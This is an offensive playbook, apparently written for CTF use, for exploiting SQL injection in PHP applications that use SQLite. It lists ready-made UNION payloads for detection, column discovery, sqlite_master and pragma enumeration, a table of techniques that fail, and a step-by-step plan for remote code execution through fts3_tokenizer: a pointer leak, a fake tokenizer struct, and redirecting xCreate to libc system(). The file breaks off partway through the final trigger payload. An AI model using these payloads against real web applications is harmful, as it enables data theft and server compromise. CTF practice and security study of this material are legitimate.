# SQLite-via-PHP SQLi Playbook

When the SQLi backend is **SQLite** accessed via PHP's `SQLite3::query()` (the most common stack on small CTF boxes), the rules are different from MySQL/PostgreSQL. This file covers detection, enumeration, and the practical RCE primitive (`fts3_tokenizer`) that's available when the build has `ENABLE_FTS3_TOKENIZER`.

---

## Detection — confirm SQLite specifically

A bare `'` produces a PHP error like:

```
Warning: SQLite3::query(): Unable to prepare statement: unrecognized token: "'" in /path/to/file.php on line N
Fatal error: Uncaught Error: Call to a member function fetchArray() on false in /path/to/file.php:M
```

Two wins from this single error: **DBMS = SQLite**, and **absolute source path leaked** (often `/home/<user>/<port>/index.php` on lab boxes — gives you the username + DB directory).

## Column count — UNION SELECT NULL,NULL,...

`ORDER BY` works but is noisy. Just brute UNION column counts 1..10:

```
?search=x' UNION SELECT 1--
?search=x' UNION SELECT 1,2--
?search=x' UNION SELECT 1,2,3--
...
```

The first one that doesn't 500/500-equivalent is the column count.

## Find which columns render

Use distinct string markers, not `1,2,3`:

```
?search=x' UNION SELECT 'AAA','BBB','CCC','DDD','EEE'--
```

Grep the rendered HTML for each marker — only the columns whose markers appear are usable for exfil. CTF templates frequently render only 2-3 of 5 columns.

## Schema enumeration — sqlite_master

SQLite has no `information_schema`. Use `sqlite_master`:

```sql
-- List all tables (and their CREATE statements)
' UNION SELECT 1, type||':'||name, sql, 4, 5 FROM sqlite_master --

-- Just one schema
' UNION SELECT 1, sql, sql, 4, 5 FROM sqlite_master WHERE name='users' --

-- Temp tables (rarely populated, but check)
' UNION SELECT 1, name, sql, 4, 5 FROM sqlite_temp_master --
```

## Pragma tables — built-in introspection (HUGE)

These are SELECTable as virtual tables. Use them for recon:

```sql
-- DB file path on disk (file column)
' UNION SELECT 1, name, file, 4, 5 FROM pragma_database_list --

-- Which functions are available (fts3_tokenizer? load_extension?)
' UNION SELECT 1, group_concat(name,'|'), group_concat(name,'|'), 4, 5 FROM pragma_function_list --

-- Virtual table modules (fts3/fts4/fts5/rtree/dbpage)
' UNION SELECT 1, group_concat(name,'|'), group_concat(name,'|'), 4, 5 FROM pragma_module_list --

-- Compile options — KEY for RCE primitives. Look for ENABLE_FTS3_TOKENIZER, ENABLE_LOAD_EXTENSION
' UNION SELECT 1, group_concat(compile_options,'|'), group_concat(compile_options,'|'), 4, 5 FROM pragma_compile_options --

-- Version
' UNION SELECT 1, sqlite_version(), sqlite_version(), 4, 5 --
```

`pragma_database_list.file` reveals the DB file path → tells you the working directory of the PHP app, not just `index.php`.

## Things that DO NOT work on PHP+SQLite

These trip up people coming from MySQL:

| Attempted | Why it fails |
|:----------|:-------------|
| Stacked queries (`'; ATTACH DATABASE …`) | `SQLite3::query()` runs **only the first statement**. Extra statements after `;` are SILENTLY DROPPED — no error, query just succeeds with first stmt. You will think it worked. It didn't. |
| `load_extension('…')` | Blocked by PHP's authorizer. Returns `Warning: SQLite3::query(): Unable to execute statement: not authorized`. Even if `ENABLE_LOAD_EXTENSION` is in compile options. |
| `INTO OUTFILE` | MySQL only. SQLite has no equivalent. |
| `LOAD_FILE()` | MySQL only. |
| `readfile()`/`writefile()` SQLite functions | Part of the `fileio.so` extension — only loaded by `sqlite3` CLI, not the library PHP links against. Won't appear in `pragma_function_list`. |
| `WITH RECURSIVE` writing files | No file primitive at all. |
| Comment styles | `--` requires a trailing space or character. Use `--+-` or `-- -` in URL params (the trailing `-` keeps the comment from being eaten by frameworks that strip trailing `--`). |

The one extender that occasionally works: `ATTACH DATABASE` IF the SQLi point allows multi-statement (some apps use `SQLite3::exec()` instead of `query()`, and exec DOES run multiple statements). Always test with a simple `'; SELECT 1; --` and look at the response delta.

## RCE primitive — fts3_tokenizer (when ENABLE_FTS3_TOKENIZER is compiled in)

If `pragma_compile_options` contains **`ENABLE_FTS3_TOKENIZER`**, you have a memory-corruption RCE primitive reachable from a single-statement UNION SELECT.

### Confirm primitive

```sql
-- Returns a raw pointer blob (libsqlite3 function ptr) → ASLR leak
' UNION SELECT 1, fts3_tokenizer('simple'), 3, 4, 5 --

-- Register a fake tokenizer at address 0x4141414141414141
' UNION SELECT 1, fts3_tokenizer('cve', x'4141414141414141'), 3, 4, 5 --
```

If the second query produces an error referencing your bytes (`Unable to execute statement: AAAAAAAA` or similar), you have **arbitrary tokenizer pointer registration**.

### Weaponization sketch (full RCE)

`fts3_tokenizer(name, blob)` treats `blob` as a `sqlite3_tokenizer_module *` — a struct whose first field is `xCreate(int argc, const char *const *argv, sqlite3_tokenizer **ppTokenizer)`.

When you then `CREATE VIRTUAL TABLE x USING fts3(tokenize=name, "arg1", "arg2")`, SQLite calls `module->xCreate(argc, argv, &out)`. Point `xCreate` at libc's `system()` and `argv[0]` (or whichever is at the right register per ABI) is your command.

Steps:

1. **Leak libsqlite3 base** — `fts3_tokenizer('simple')` returns the address of the simple-tokenizer module struct. Subtract the known offset to get libsqlite3 base.
2. **Find `system` in libc** — either dump `/proc/self/maps` if you have any read primitive, or chain through libsqlite3's GOT entries (also exposed via `fts3_tokenizer` of other built-ins). On glibc x86_64 with default ASLR, libc base is offset-derivable from libsqlite3 once you know the binary versions.
3. **Build fake module struct in memory** — easiest: use a known writable address inside libsqlite3's BSS (look at `pragma_function_list` outputs to find addresses), or use a SQLite blob stored in a temp table whose page address you predict via `dbstat`. Struct layout (sqlite3.h):
   ```c
   struct sqlite3_tokenizer_module {
     int iVersion;
     int (*xCreate)(int argc, const char *const *argv, sqlite3_tokenizer **ppTokenizer);
     int (*xDestroy)(sqlite3_tokenizer *pTokenizer);
     int (*xOpen)(...);
     int (*xClose)(...);
     int (*xNext)(...);
     int (*xLanguageid)(...);
   };
   ```
4. **Register & trigger**:
   ```sql
   '